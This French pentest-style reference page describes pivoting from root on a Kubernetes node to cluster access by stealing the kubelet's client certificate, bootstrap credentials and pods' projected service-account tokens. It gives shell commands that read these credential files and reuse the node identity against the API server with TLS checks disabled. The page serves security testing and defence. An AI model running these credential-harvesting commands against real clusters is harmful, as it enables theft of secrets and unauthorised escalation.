---
order: 4
title: "Vol d'identifiants du kubelet : voler l'identité du nœud pour pivoter vers le cluster"
description: "Le kubelet de chaque nœud s'authentifie auprès de l'API server avec un certificat client et détient sur le disque les identifiants de bootstrap et du nœud. Un attaquant qui atteint le système de fichiers du nœud vole le certificat client du kubelet et les tokens projetés de chaque pod du nœud, pivotant du root sur le nœud vers un large accès au cluster grâce à l'identité propre du nœud et à celles de ses pods."
keywords:
  - kubelet
  - identifiants du nœud
  - certificat client
  - bootstrap token
  - pivot vers le cluster
---

# Vol d'identifiants du kubelet

Posséder un nœud n'est pas l'objectif final ; les identifiants du nœud sont le pivot vers le cluster. Le kubelet s'authentifie auprès de l'API server avec un certificat client stocké sur le nœud, le nœud peut détenir un bootstrap token utilisé pour rejoindre le cluster, et chaque pod planifié sur le nœud possède son token de service account projeté sur le disque. Récolter ceux-ci transforme le root sur le nœud en l'identité de cluster propre au nœud, plus les identités de tous ses pods.

Collectez les identifiants depuis le système de fichiers du nœud :

```bash
# kubelet client certificate and key (the node's API identity)
ls -l /var/lib/kubelet/pki/
cat /var/lib/kubelet/pki/kubelet-client-current.pem      # cert+key, system:node:<name>
# the kubelet kubeconfig points at the API server and this cert
cat /etc/kubernetes/kubelet.conf 2>/dev/null
# bootstrap credentials, if the node still has them
cat /etc/kubernetes/bootstrap-kubelet.conf 2>/dev/null
# every pod's projected service-account token on this node
cat /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
```

## Utiliser l'identité du nœud

```bash
# authenticate as the node (system:node:<name>, in the system:nodes group)
kubectl --client-certificate=kubelet-client-current.pem \
  --client-key=kubelet-client-current.pem \
  --server=https://<apiserver>:6443 --insecure-skip-tls-verify get nodes
# the Node authorizer lets a node read the secrets and configmaps of pods
# scheduled to it; enumerate those, then use the richest pod token found
```

L'identité du nœud est limitée par le mode d'autorisation Node aux ressources liées à ses propres pods, mais cela inclut déjà les secrets de ces pods ; un token de pod appartenant à un service account puissant permet d'escalader davantage.

## Notes d'exploitation

- Le certificat client du kubelet s'authentifie en tant que `system:node:<name>` dans le groupe `system:nodes` ; l'autorisateur Node lui accorde la lecture des secrets et configmaps des pods rattachés à ce nœud, ce qui constitue une large récolte de secrets.
- Les tokens de pods projetés sur le nœud sont souvent le plus gros butin : un pod de contrôleur ou système qui y est planifié porte un service account doté d'un RBAC étendu ; décodez chacun et testez-le selon [Token de service account vers l'API](../lateral-movement/service-account-token-to-api.md).
- Un bootstrap token, s'il est présent, peut enrôler des nœuds contrôlés par l'attaquant ou être réutilisé selon la configuration du cluster ; traitez-le comme un identifiant durable.

## Références

- [Kubernetes: node authorization](https://kubernetes.io/docs/reference/access-authn-authz/node/)
- [Kubernetes: kubelet TLS bootstrapping](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-tls-bootstrapping/)
- [HackTricks: Kubernetes node pivot](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
